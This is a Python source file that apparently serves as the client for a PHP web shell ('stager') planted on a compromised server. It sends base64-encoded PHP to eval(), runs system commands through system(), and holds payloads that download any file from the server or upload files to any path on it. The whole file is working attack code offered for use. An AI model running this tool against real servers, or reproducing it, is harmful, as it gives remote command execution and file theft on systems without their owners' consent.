import requests
import base64

from . import util

DOWNLOAD_PAYLOAD = '''header("Content-Description: File Transfer"); 
header("Content-Type: application/octet-stream"); 
header("Content-Disposition: attachment; filename=\\"". basename($_GET['file']) ."\\"");
readfile($_GET["file"]);'''

UPLOAD_PAYLOAD = '''echo move_uploaded_file($_FILES['file']['tmp_name'], $_GET['n']) ? "OK" : "FAIL";'''


def execute_code(stager_url: str, code: str, post: bool = False, params: set = {}, data: set = {}) -> str:
    if post:
        r = requests.post(stager_url, params=util.sum_dicts({'c': "eval(base64_decode($_POST['p']));"}, params),
                          data=util.sum_dicts({'p': base64.b64encode(code.encode())}, data))
    else:
        r = requests.get(stager_url, params=util.sum_dicts({'c': code}, params))

    return r.text


def execute_system(stager_url: str, command: str) -> str:
    r = requests.post(stager_url, params={'c': f"system(base64_decode($_POST['p']));"},
                      data={'p': base64.b64encode(command.encode())})
    return r.text


def download_file(stager_url: str, remote_path: str, file: object, param: str = 'c'):
    payload = base64.b64encode(DOWNLOAD_PAYLOAD.encode()).decode()

    with requests.post(stager_url, params={param: f"eval(base64_decode($_POST['p']));", 'file': remote_path},
                       data={'p': payload}, stream=True) as r:
        r.raise_for_status()
        with file as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)


def upload_file(stager_url: str, file: object, remote_path: str, param: str = 'c') -> bool:
    payload = base64.b64encode(UPLOAD_PAYLOAD.encode()).decode()

    r = requests.post(stager_url, params={param: f"eval(base64_decode($_POST['p']));", 'n': remote_path},
                      data={'p': payload},
                      files={'file': file})

    return r.text == 'OK'


def perform_basic_tests(stager_url: str) -> bool:
    token = util.random_string(15)
    if execute_code(stager_url, f'echo "{token}";') != token:
        return False

    # Add more eventual tests further on

    return True
